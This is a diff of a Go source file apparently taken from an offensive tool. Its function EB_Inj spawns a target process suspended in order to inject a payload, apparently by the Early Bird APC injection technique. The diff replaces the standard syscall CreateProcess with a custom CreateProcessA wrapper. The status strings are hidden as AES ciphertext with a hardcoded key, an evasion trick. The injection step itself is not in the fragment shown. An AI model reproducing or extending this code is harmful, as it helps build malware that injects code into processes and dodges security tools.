@@ -2,7 +2,6 @@ package main
 
 import "os"
 import "fmt"
-import "syscall"
 import "unsafe"
 
 
@@ -14,15 +13,16 @@ func EB_Inj(proc string, payload []byte) {
       os.Exit(-1);
    }
 
-   // CreateProcess
-   var sI syscall.StartupInfo;
-   var pI syscall.ProcessInformation;
-   argv := syscall.StringToUTF16Ptr(proc);
-   var err error = syscall.CreateProcess( nil, argv, nil, nil, false, 4, nil, nil, &sI, &pI);
-   if (err != nil){
+   // CreateProcessA
+   var sI StartupInfo;
+   var pI ProcessInformation;
+   spawner_proc_str := StringToCharPtr(proc)
+   var create_process_res uintptr = CPA(0, uintptr(unsafe.Pointer(spawner_proc_str)), 0, 0, 0, 4, 0, 0, uintptr(unsafe.Pointer(&sI)), uintptr(unsafe.Pointer(&pI)))
+   if (create_process_res == 0){
       var cp_err_msg string = GetAESDecrypted_aux("wQpBPWJfjyjwim/zEV2Kh+g8u9RKtVqHVZbXiLlVIng=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
-      fmt.Println(cp_err_msg, "\t\t", err);
+      fmt.Println(cp_err_msg);
    }
+
    var pid_msg string = GetAESDecrypted_aux("py7a9AvfJoG/m+X0ntf20w==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
    fmt.Println(pid_msg, "\t\t\t", pI.ProcessId);
    var thread_id_msg string = GetAESDecrypted_aux("Q5e5maNDzBuINEpTUL5eNQ==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
